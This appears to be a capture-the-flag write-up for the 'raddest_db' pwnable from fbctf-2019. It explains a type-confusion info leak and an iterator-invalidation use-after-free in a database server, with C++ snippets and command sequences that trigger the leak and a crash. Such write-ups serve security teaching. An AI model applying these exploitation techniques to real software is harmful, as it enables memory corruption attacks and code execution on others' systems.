raddest_db
---

Exploit this database server.




Vulnerabilities
---
```
$ checksec raddest_db
[*] '/home/n/fbctf-2019/pwnables/raddest_db/raddest_db'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

1. InfoLeak: Type Confusion when storing typed objects.

Objects can be of type String, Integer, or Float. With the `store`  command.

```
>>> store db string 1 aaaa
```

When an object is stored for the first time, that index in the database is now of that type.
The next time an object is stored, the element attribute is updated using the new object

```c++
void RaddestDBDatabase::StoreStringElement(uint32_t key, const char *value) {
  auto it = backing_store_->find(key);

  if (it == backing_store_->end()) {
    StringElement *new_element = new StringElement(value);
    StoreElement(key, new_element);
  } else {
    StringElement *old_element = reinterpret_cast<StringElement *>(it->second);

    size_t len = strnlen(value, 1024);
    char *new_value = new char[len + 1];
    memset(new_value, 0, len + 1);
    strncpy(new_value, value, len);

    old_element->element = new_value; <---
  }
}
```

So if a float is stored in an index and then it is updated to a string the object will object
will be treated as a float in all operations like getting the value of the float.

```
>>> store db float 1 1.1
>>> store db string 1 bbbb
>>> get db 1
4.6724572784052174782247859363579e-310
```

Float -> String can be used to leak the address of the `char *` pointers that back the string.
This is a heap leak.

String -> Float can be used to leak any arbitrary address that can be represented as an IEEE754
floating point value.

```
>>> store db string 1 aaaa
>>> store db float 1 4.6724572784052174782247859363579e-310
>>> get db 1
bbbb
```

2. Code Execution: Iterator invalidation vtable dereference

Users can define getters on certain indexes. These getters have callbacks that are executed
after the index is retrieved.

Example of Getters being used internally in the `RaddestDBDatabase::Get(key)` method

```c++
void RaddestDBDatabase::Get(uint32_t key) {
  ArrayElement *element = GetArrayElement(key);
  if (element == NULL) return;
  element->print();
  CallGetters(key);
}
```

This usage is safe. Now here is CallGetters being called in the PrintElements function within a loop.

```c++
void RaddestDBDatabase::PrintElements(void) {
  int count = 0;
  for (auto it = backing_store_->begin(); it != backing_store_->end(); ++it) {
    it->second->print();
    CallGetters(it->first); <----
  }
}
```

A getter can modify backing store in the middle of the iteration, leading to the iterator being
invalidated
  * https://www.geeksforgeeks.org/iterator-invalidation-cpp/

```
>>> store db float 1 1.1
>>> store db float 2 1.1
>>> store db float 3 1.1
>>> store db float 4 1.1
>>> store db float 5 1.1
>>> store db float 6 1.1
>>> store db float 7 1.1
>>> store db float 8 1.1
>>> getter db float 5 5
[getter]: empty
[getter]: store db float 10 AAAAAAAAAAAAAAAAAA
[getter]: store db float 10 AAAAAAAAAAAAAAAAAA
[getter]: store db float 10 AAAAAAAAAAAAAAAAAA
[getter]: echo done
>>> printn
(Segmentation fault)
```

Iterator invalidation results in UAF so the `it->second->print()` can result in arbitrary vtable
dereference.
  * https://bugzilla.mozilla.org/show_bug.cgi?id=1321066
